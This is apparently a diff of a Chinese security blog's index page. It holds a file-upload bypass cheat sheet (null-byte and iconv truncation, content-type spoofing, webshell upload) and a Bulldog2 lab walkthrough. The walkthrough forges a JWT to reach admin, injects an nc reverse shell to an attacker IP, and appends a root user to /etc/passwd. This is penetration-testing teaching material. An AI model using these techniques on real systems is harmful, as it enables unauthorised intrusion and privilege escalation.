class="line">filepath漏洞主要用来突破服务器自动命名规则，主要有以下两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 改变文件上传后路径`(filepath)`，可以结合目录解析漏洞，路径`/x.asp/`</span><br><span class="line"></span><br><span class="line">  2. 直接改变文件名称(都是在`filepath`下进行修改)，路径`/x.asp;`</span><br><span class="line"></span><br><span class="line">##### 00截断</span><br><span class="line"></span><br><span class="line">00截断的两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 更改filename，`xx.php .jpg`在burpsuit中将空格对应的 *hex* `2e`改为`00`</span><br><span class="line"></span><br><span class="line">  2. 更改filename，`xx.php%00.jpg` 在burpsuit中将`%00`进行右键转换`-url-urldecoder`</span><br><span class="line"></span><br><span class="line">##### filetype漏洞</span><br><span class="line"></span><br><span class="line">filetype漏洞主要是针对`content-type`字段，主要有两种利用方式：</span><br><span class="line"></span><br><span class="line">  1. 先上传一个图片，然后将`content-type:images/jpeg`改为`content-type:text/asp`，然后对filename进行`00截断`，将图片内容替换为一句话木马。</span><br><span class="line"></span><br><span class="line">  2. 直接使用burp抓包，得到`post`上传数据后，将`Content-Type: text/plain`改成 `Content-Type: image/gif`。</span><br><span class="line"></span><br><span class="line">##### iconv函数限制上传</span><br><span class="line"></span><br><span class="line">  如果发现不论上传什么文件，上传后的文件都会自动添加一个`.jpg`的后缀，那么可以怀疑是否是使用`iconv`这个函数进行了上传的限制，此时可以使用`80-EF截断`，也就是修改 *HEX* 为`80`到`EF`中的某一个来进行截断，如果真是使用这个函数的话，那么将上传任意文件成功，如上传一个`xx.php `，然后截断抓包将后面的空格对应的十六进制改为`80`到`EF`中的任意一个</span><br><span class="line"></span><br><span class="line">##### 双文件上传</span><br><span class="line"></span><br><span class="line">再一个文件上传的地方，右键审查元素，首先修改`action`为完整路径，然后复制粘贴上传浏览文件`&lt;input ......&gt;`，这样就会出现两个上传框，第一个上传正常文件，第二个选择一句话木马，然后提交。</span><br><span class="line"></span><br><span class="line">##### 表单提交按钮</span><br><span class="line"></span><br><span class="line">我们有时扫描发现上传路径，可是只有一个浏览文件，却没有提交按钮，此时我们就需要写入提交按钮。</span><br><span class="line"></span><br><span class="line">  写入表单：</span><br><span class="line">  F12审查元素，在选择文件表单下面添加提交按钮代码。</span><br><span class="line">　　 ```&lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;xx&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-
-          
+          解析漏洞　　一些特殊文件被IIS Apache Nginx在某种情况下解析成脚本文件格式的漏洞
+IIS 6.0解析漏洞
+目录解析漏洞 /xx.asp/xx.jpg
+在网站下创建文件夹名字为.asp .asa的文件夹，其目录内的任何扩展名的文件都被iis当做asp文件来解析并执行。因此只要攻击者可以通
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/文件解析漏洞/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2071,50 +1721,22 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <p>参考链接：<a href="https://www.anquanke.com/post/id/160755" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160755</a></p>
-<p>攻击机 ip：192.168.60.230<br>靶机 ip：192.168.30.231<br><img src="https://upload-images.jianshu.io/upload_images/12585049-29f8ea370b9cb2ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>端口扫描这里仍然使用 <code>nmap</code></p>
-<blockquote>
-<p>nmap -sV -p- 192.168.60.231</p>
-</blockquote>
-<p>查看到只开放了一个 <code>80</code>端口<br><img src="https://upload-images.jianshu.io/upload_images/12585049-28e0f541a97a5594.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>访问web页面，通过指纹识别工具查询到编程语使用的是<code>Node.js</code>，服务器<code>Nginx</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-d6fabf9a7a58a75a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>端口探测后开始进行目录探测，这里使用<code>Dirbuster</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-260d5926b220835c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>没有查询到可以直接利用的目录，访问<code>web</code>页面发现<code>Register</code>功能<br>点击<code>Register</code>报错，查看源代码发现四个js文件，在<code>main.8b490782e52b9899e2a7.bundle.js</code>文件中查找<code>Register</code><br>注册要求显示<code>Content-Type</code>字段值为<code>application/json</code><br>必须使用<code>post</code>方法提交数据，地址为<code>users/register</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-9839890d85010282.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>提交参数有四个如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-46fff7c35201581c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>浏览器抓包更改数据包并发送<br>显示成功注册<br><img src="https://upload-images.jianshu.io/upload_images/12585049-a6ffbffaa3c769e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>登录注册的用户，登录时抓包，发现返回包带有一个<code>JWT</code>开头的<code>token</code>字段<br>百度了一下 <code>Json web token</code>（JWT）的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。<br><img src="https://upload-images.jianshu.io/upload_images/12585049-0730cb72568520ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>JWT解密后发现<code>auth_level</code>参数<br><img src="https://upload-images.jianshu.io/upload_images/12585049-6cee2fd3c2733d33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>再在<code>js</code>文件中查询一下，发现值为<code>master_admin_user</code>时为<code>admin</code>用户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-5a76675f4c4f9b88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>将<code>auth_level</code>设置值后，返回进行<code>JWT</code>加密并发送数据包<br><img src="https://upload-images.jianshu.io/upload_images/12585049-38f8666df6ccb54a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>返回<code>web</code>页面发现用户变更<code>admin</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-6c0ec1ebce438bf3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>在修改密码页面存在命令执行漏洞，反弹<code>shell</code><br><code>kali</code>对<code>4050</code>端口进行监听</p>
-<blockquote>
-<p>root@kali:~# nc -lvp 4050</p>
-</blockquote>
-<p>在密码处执行反弹<code>shell</code>命令并发送包</p>
-<blockquote>
-<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.60.230 4050 &gt;/tmp/f</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-e384ed478abf6875.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>此时<code>kali</code>成功拿到<code>shell</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-fd4b1445bf9f3612.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>使用<code>python</code>命令获得一个标准<code>shell</code>(直接获取到的shell是真的难用的不行)</p>
-<blockquote>
-<p>python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-129a8a350b54a6db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>拿到<code>shell</code>后开始进行提权<br>创建一个新用户</p>
-<blockquote>
-<p>$ perl -le ‘print crypt(“pass”,”fairy”)’</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-242bda8cb9a64733.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>将新用户生成的密文写进<code>/etc/passwd</code>文件</p>
-<blockquote>
-<p>$ echo ‘fairy:faa8LvXdAzuag:0:0:fairy:/root:/bin/bash’ &gt;&gt; /etc/passwd</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-ab9162d6e1769320.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>查看<code>/etc/passwd</code> 文件</p>
-<blockquote>
-<p>cat /etc/passwd</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-a0c67473729b555f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>登录刚刚创建的<code>fairy</code>用户，成功提权至<code>root</code>用户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f4f178e2f1f7dcf7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+          参考链接：https://www.anquanke.com/post/id/160755
+攻击机 ip：192.168.60.230靶机 ip：192.168.30.231
+端口扫描这里仍然使用 nmap
 
-          
+nmap -sV -p- 192.168.60.231
+
+查看到只开放了一个 80端口
+访问
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/渗透测试-靶机Bulldog2/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
